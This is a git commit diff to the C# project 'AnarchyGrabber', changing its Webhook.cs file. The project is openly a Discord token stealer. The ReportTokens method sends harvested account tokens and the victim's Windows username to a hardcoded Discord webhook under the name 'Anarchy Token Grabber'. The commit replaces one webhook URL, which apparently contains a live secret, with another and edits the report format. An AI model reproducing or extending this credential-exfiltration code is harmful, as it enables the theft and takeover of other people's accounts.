401167a5b0b6e271a8282591d25eed0540650d35
Cazcez <50046813+Cazcez@users.noreply.github.com>
2019-12-28 21:33:31 +0300

    up

--- AnarchyGrabber/Webhook.cs
+++ AnarchyGrabber/Webhook.cs
@@ -7,7 +7,7 @@ namespace AnarchyGrabber
     public static class Webhook
     {
         //you've got to change this to your own discord webhook url
-        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/649861953325367297/LlFuipVbRcCY57GfrG9Jcw6G1VsyMR8L0hVvp7aqYClmON2_Mdie7fdhGtw3iUws6ilS";
+        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/660538211088728104/qBBSwPs9gGZf6stkmS2TC-MEJx0GOYgE89PKszIrFlJw99BGqhqVTjzt-10LGPh_YobI";
 
 
         public static void ReportTokens(List<string> tokenReport)
@@ -17,7 +17,7 @@ namespace AnarchyGrabber
                 HttpClient client = new HttpClient();
                 Dictionary<string, string> contents = new Dictionary<string, string>
                     {
-                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
+                        { "content", $"------------------\nToken report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                         { "username", "Anarchy Token Grabber" },
                         { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
                     };
